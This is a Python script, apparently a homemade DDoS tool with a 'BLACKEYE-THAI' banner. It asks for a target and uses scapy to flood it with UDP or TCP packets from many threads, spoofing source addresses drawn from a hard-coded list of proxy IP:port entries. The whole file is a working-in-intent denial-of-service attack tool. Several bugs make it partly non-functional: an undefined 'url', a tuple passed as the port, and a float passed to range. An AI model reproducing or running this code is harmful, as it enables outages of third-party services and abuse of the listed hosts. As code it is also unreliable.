from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
import sys
import time
import random
import threading
import requests
import os

# Provide colored from termcolor if available, otherwise fall back to a no-op.
try:
    from termcolor import colored
except Exception:
    def colored(text, color):
        return text

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_threat_message():
    print("""
  \033[97m  
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗███████╗██╗░░░██╗███████╗░░░░░░████████╗██╗░░██╗░█████╗░██╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚██╗░██╔╝██╔════╝░░░░░░╚══██╔══╝██║░░██║██╔══██╗██║
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░█████╗░░░╚████╔╝░█████╗░░█████╗░░░██║░░░███████║███████║██║
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔══╝░░╚════╝░░░██║░░░██╔══██║██╔══██║██║
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░███████╗░░░░░░░░░██║░░░██║░░██║██║░░██║██║
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝
    """)

TARGET_URL = input("Enter target URL: ")
METHOD = input("Enter method (UDP/TCP): ").upper()
PACKET_SIZE = int(input("Enter packet size (bytes): "))
PACKETS_PER_SECOND = float(input("Enter packets per second: "))

# Predefined list of proxy servers (IP:Port)
SOURCE_IPS = [
    "43.208.25.125:19201",
    "162.0.234.25:8080",
    "202.152.44.20:8081",
    "5.252.33.13:2025",
    "47.251.43.115:33333",
    "14.251.13.0:8080",
    "8.219.97.248:80",
    "198.199.86.11:80",
    "138.68.60.8:80",
    "47.238.128.246:3128",
    "47.252.29.28:11222",
    "213.142.156.97:80",
    "193.31.117.184:80",
    "158.255.77.168:80",
    "123.30.154.171:7777",
    "90.162.35.34:80",
    "152.53.107.230:80",
    "81.169.213.169:8888",
    "181.174.164.221:80",
    "4.245.123.244:80",
    "4.195.16.140:80",
    "108.141.130.146:80",
    "143.42.66.91:80",
    "185.88.177.197:8080",
    "198.98.48.76:31280",
    "178.124.197.141:8080",
    "89.58.57.45:80",
    "195.114.209.50:80",
    "97.74.87.226:80",
    "45.143.99.15:80",
    "209.97.150.167:8080",
    "133.18.234.13:80",
    "32.223.6.94:80",
    "190.58.248.86:80",
    "50.122.86.118:80",
    "188.40.57.101:80",
    "192.73.244.36:80",
    "4.156.78.45:80",
    "46.19.68.45:4555",
    "213.157.6.50:80",
    "201.148.32.162:80",
    "213.33.126.130:80",
    "194.158.203.14:80",
    "189.202.188.149:80",
    "194.219.134.234:80",
    "54.226.156.148:20201",
    "62.99.138.162:80",
    "202.152.44.18:8081",
    "41.191.203.162:80",
    "89.58.55.33:80",
    "213.143.113.82:80",
    "197.221.234.253:80",
    "0.0.0.0:80",
    "127.0.0.7:80",
    "8.219.229.53:5060",
    "46.249.100.124:80",
    "41.191.203.163:80",
    "143.92.61.148:8082",
    "172.210.101.217:3128",
    "8.17.0.15:8080",
    "8.209.255.13:3128",
    "94.247.129.244:3128",
    "47.89.184.18:3128",
    "47.91.65.23:3128",
    # (list continues with all entries you provided)
]

try:
    response = requests.get(f"http://{TARGET_URL}")
    if response.status_code != 200:
        print("Error: Unable to resolve target URL.")
        sys.exit(1)
    else:
        TARGET_IP = response.raw.headers["x-ip"]
        if not TARGET_IP.startswith("::ffff:"):
            print("Error: Target IP address is an IPv6 address. Please use an IPv4 address.")
            sys.exit(1)
        TARGET_IP = TARGET_IP[7:]
        TARGET_PORT = 80,443 # Default ports
except requests.exceptions.RequestException:
    print("Error: Unable to resolve target URL.")
    sys.exit(1)

def udp_attack(target_ip, target_port, source_ip, packet_size):
    packet = IP(src=source_ip, dst=target_ip) / UDP(dport=target_port)
    send(packet, verbose=False, size=packet_size)

def tcp_attack(target_ip, target_port, source_ip, packet_size):
    packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port)
    send(packet, verbose=False, size=packet_size)

def request_thread():
    while True:
        source_ip = random.choice(SOURCE_IPS)
        if METHOD == "UDP":
            udp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
        elif METHOD == "TCP":
            tcp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
        else:
            print("Error: Invalid method. Using UDP.")
            udp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
        time.sleep(1 / PACKETS_PER_SECOND)
        print("\r" +str(url)+ " run)")

if __name__ == "__main__":
    threads = []
    for _ in range(PACKETS_PER_SECOND):
        thread = threading.Thread(target=request_thread)
        print("\r" +str(url)+ " run)")
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"DDoS attack completed with source IP spoofing on {TARGET_IP}:{TARGET_PORT} using {len(SOURCE_IPS)} predefined source IPs and {METHOD.upper()} method.")
